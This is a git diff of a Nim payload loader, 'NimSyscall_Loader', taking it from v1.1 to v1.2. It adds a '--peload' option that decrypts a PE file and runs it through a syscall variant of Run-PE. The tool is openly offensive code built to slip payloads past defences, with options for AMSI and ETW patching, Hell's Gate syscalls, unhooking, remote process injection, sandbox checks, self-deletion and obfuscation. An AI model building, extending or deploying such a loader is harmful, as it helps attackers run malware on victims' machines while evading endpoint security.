@@ -44,7 +44,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.1                                             
+                                                                 v1.2                                             
 """
 
 echo banner
@@ -52,10 +52,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.1
+NimSyscall_Loader v 1.2
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --unhook --reflective --obfuscate --hide --noArgs --pe --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain>]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain>]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -79,7 +79,8 @@ Options:
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation (not possible in combination with --reflective)
   --hide    Compile with --app:gui flag, so that the console won't pop up
-  --pe    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
+  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
+  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
   --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --sandbox Check1    Include Sandbox Checks of your choice into the loader
@@ -118,14 +119,15 @@ var
     reflective: bool = false
     hide: bool = false
     noArgs: bool = false
-    pe: bool = false
+    peinject: bool = false
+    peload: bool = false
     hellsgate: bool = false
     selfdelete: bool = false
     remoteprocess: string = ""
     remoteprocessesstring: string
     replace: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.1")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.2")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -185,8 +187,11 @@ if args["--hide"]:
 if args["--noArgs"]:
   noArgs = true
 
-if args["--pe"]:
-  pe = true
+if args["--peinject"]:
+  peinject = true
+
+if args["--peload"]:
+  peload = true
 
 if args["--hellsgate"]:
   hellsgate = true
@@ -211,7 +216,7 @@ if args["--self-delete"]:
 var blob: string
 #Read file and if PE convert to shellcode before
 if (shellcode):
-    if (pe):
+    if (peinject):
         when system.hostOS == "windows":
             var exist: bool = existsFile("donut.exe")
         else:
@@ -313,7 +318,7 @@ import winim/lean
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, CreateFileA, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, GetFileSize, HeapAlloc, GetProcessHeap, ReadFile, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, GetCurrentProcess, GetCurrentProcessId, OpenProcess, PROCESS_ALL_ACCESS, FALSE, VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, VirtualProtect, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES, NtClose
 import dynlib
 import strformat
-from os import sleep, paramCount, paramStr
+from os import paramCount, paramStr
 from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
 import base64
 import strutils
@@ -451,6 +456,24 @@ if (hellsgate):
             stub.add(LoadAssemblyStub)
             stub.add(LoadAssemblyStubArgs)
         csharp = false
+if (peload):
+    stub.add(GetSyscallStub)
+    if (AMSI):
+        stub = stub &  AMSIETWDelegates & AMSIStub
+        if(ETW):
+            if (COMVARETW):
+                stub = stub & ETWCOMVARStub
+            else:
+                stub = stub & ETWPatchStub
+    else:
+        if(ETW):
+            if (COMVARETW):
+                stub = stub & ETWCOMVARStub
+            else:
+                stub = stub & AMSIETWDelegates & ETWPatchStub
+    stub.add(ProtectWriteAllocSyscalls)
+    stub.add(PELoadStub)
+    shellcode = false
 if (shellcode):
     stub.add(GetSyscallStub)
     if (AMSI):
